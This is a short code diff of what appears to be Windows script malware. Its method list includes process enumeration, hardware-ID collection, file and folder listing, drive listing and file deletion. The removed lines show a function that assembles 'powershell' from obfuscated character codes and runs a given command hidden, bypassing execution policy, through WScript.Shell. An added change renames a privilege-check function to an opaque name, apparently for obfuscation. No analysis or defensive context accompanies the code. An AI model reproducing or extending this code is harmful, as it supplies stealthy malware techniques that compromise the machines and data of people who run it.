@@ -18,7 +18,6 @@
     <method name="var6"></method>
 	<method name="DeleteAFile"></method>
 	<method name="enumprocess"></method>
-	<method name="elevated"></method>
 	<method name="HWIDf"></method>
 	<method name="GetFilesAndFolders"></method>
 	<method name="GetHardDirve"></method>
@@ -154,23 +153,16 @@ Function MaxFrameworkVersionCheck()
 	end if
  End Function
  
-function var6(link,ERR)
-
-		C=chr(30+30+5+5+10) &"owershell -ExecutionPolicy Bypass -windowstyle hidden -Command "
-      param = link
-      param2 = ERR 
-	  
-createobject("WScript.Shell").Run C & chrw(34) & param  & Chrw(34),0,false
-	  
- End function 
-
-Function elevated()
+function var6()
 if WScript.Arguments.Named.Exists("elevated") = false then
-		elevated= "user"
+		var6= "user"
 else
-		elevated= "Admin"
+		var6= "Admin"
 end if
-End function
+	  
+End function 
+
+
  
 Function DeleteAFile(filespec)
 	Dim fso
